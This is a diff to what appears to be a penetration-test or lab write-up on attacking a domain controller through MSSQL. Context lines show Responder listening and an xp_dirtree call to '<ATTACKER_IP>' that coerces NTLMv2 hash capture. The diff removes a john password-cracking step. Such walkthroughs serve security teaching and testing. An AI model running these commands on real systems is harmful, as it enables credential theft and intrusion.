@@ -104,13 +104,8 @@ sudo responder -I tun0
 EXEC master.dbo.xp_dirtree '\\<ATTACKER_IP>\share';
 ```
 
-We successfully capture the NTLMv2 hash for `DC01$` (the machine account). While cracking machine account hashes is typically unlikely to succeed, we attempt it anyway:
+We successfully capture the NTLMv2 hash for `DC01$` (the machine account). cracking machine account hashes is typically unlikely to succeed.
 
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt dc01_hash.txt
-```
-
-As expected, the hash does not crack.
 
 ### Linked Server Discovery
 
